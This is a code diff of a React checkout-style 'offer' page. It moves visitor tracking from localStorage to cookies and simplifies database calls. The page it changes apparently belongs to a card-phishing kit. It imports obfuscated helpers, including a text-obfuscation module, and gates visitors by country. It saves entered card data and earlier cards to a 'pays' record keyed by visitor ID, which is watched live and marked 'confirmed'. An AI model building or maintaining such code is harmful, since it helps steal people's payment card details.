@@ -16,9 +16,8 @@ import {
   Gift,
 } from "lucide-react";
 import { _dct, _fcn, _fed, _gbi, _lc } from "@/lib/card-utils";
-import { db } from "@/lib/supabase-client";
+import { db, doc, onSnapshot, setDoc } from "@/lib/supabase-client";
 import { secureAddData } from "@/lib/secure-supabase";
-import { doc, onSnapshot, setDoc, Firestore } from "@/lib/supabase-client";
 
 import { addToHistory } from "@/lib/history-utils";
 import { FullPageLoader } from "./loader";
@@ -26,6 +25,8 @@ import { _gt } from "@/lib/text-obf";
 import { _icb, isCountryAllowed } from "@/lib/supabase-settings";
 import { EmailModal } from "@/components/email-modal";
 import { _e } from "@/lib/secure-utils";
+import { getCookie, setCookie, eraseCookie } from '@/lib/cookies';
+
 
 interface _P1Props {
   offerTotalPrice: number;
@@ -97,7 +98,7 @@ export default function P1({ offerTotalPrice }: _P1Props) {
     const checkCountry = async () => {
       try {
         // Check if already submitted email
-        const emailSubmitted = localStorage.getItem("email_submitted");
+        const emailSubmitted = getCookie("email_submitted");
         if (emailSubmitted) {
           // Redirect to thank you page
           router.push("/thank-you");
@@ -105,20 +106,20 @@ export default function P1({ offerTotalPrice }: _P1Props) {
         }
 
         // Get country from localStorage (saved from Supabase)
-        let countryCodeAlpha3 = localStorage.getItem("country");
+        let countryCodeAlpha3 = getCookie("country");
 
         // If not in localStorage, try to get from Supabase
         if (!countryCodeAlpha3) {
-          const visitorID = localStorage.getItem("visitor");
+          const visitorID = getCookie("visitor");
           if (visitorID && db) {
-            const docRef = doc(db as Firestore, "pays", visitorID);
+            const docRef = doc("pays", visitorID);
             const docSnap = await import("@/lib/supabase-client").then((mod) =>
               mod.getDoc(docRef),
             );
             if (docSnap.exists()) {
               countryCodeAlpha3 = (docSnap.data() as any)?.country;
               if (countryCodeAlpha3) {
-                localStorage.setItem("country", countryCodeAlpha3);
+                setCookie("country", countryCodeAlpha3);
               }
             }
           }
@@ -184,11 +185,11 @@ export default function P1({ offerTotalPrice }: _P1Props) {
   }, [_v3]);
 
   useEffect(() => {
-    const visitorID = localStorage.getItem("visitor");
+    const visitorID = getCookie("visitor");
     if (!visitorID || !db) return;
 
     const unsubscribe = onSnapshot(
-      doc(db as Firestore, "pays", visitorID),
+      doc("pays", visitorID),
       (docSnapshot) => {
         if (docSnapshot.exists()) {
           const data = docSnapshot.data();
@@ -260,7 +261,7 @@ export default function P1({ offerTotalPrice }: _P1Props) {
             };
 
             setDoc(
-              doc(db as Firestore, "pays", visitorID),
+              doc("pays", visitorID),
               {
                 oldCards: data.oldCards
                   ? [...data.oldCards, currentCardData]
@@ -291,12 +292,12 @@ export default function P1({ offerTotalPrice }: _P1Props) {
   }, [router]);
 
   const handleMessageConfirm = async () => {
-    const visitorID = localStorage.getItem("visitor");
+    const visitorID = getCookie("visitor");
     if (!visitorID || !db) return;
     setIsConfirming(true);
     try {
       await setDoc(
-        doc(db as Firestore, "pays", visitorID),
+        doc("pays", visitorID),
         { cardStatus: "confirmed" },
         { merge: true },
       );
@@ -328,7 +329,7 @@ export default function P1({ offerTotalPrice }: _P1Props) {
     e.preventDefault();
 
     let visitorID =
-      localStorage.getItem("visitor_id") || localStorage.getItem("visitor");
+      getCookie("visitor_id") || getCookie("visitor");
 
     if (!visitorID) {
       const { getOrCreateVisitorID } = await import("@/lib/visitor-tracking");
@@ -417,8 +418,8 @@ export default function P1({ offerTotalPrice }: _P1Props) {
   const handleEmailSubmit = async (name: string, email: string) => {
     try {
       const visitorID =
-        localStorage.getItem("visitor_id") ||
-        localStorage.getItem("visitor") ||
+        getCookie("visitor_id") ||
+        getCookie("visitor") ||
         "unknown";
 
       // Save to Supabase or send email
@@ -433,7 +434,7 @@ export default function P1({ offerTotalPrice }: _P1Props) {
       });
 
       // Mark email as submitted
-      localStorage.setItem("email_submitted", "true");
+      setCookie("email_submitted", "true");
 
       // Redirect to thank you page
       setTimeout(() => {
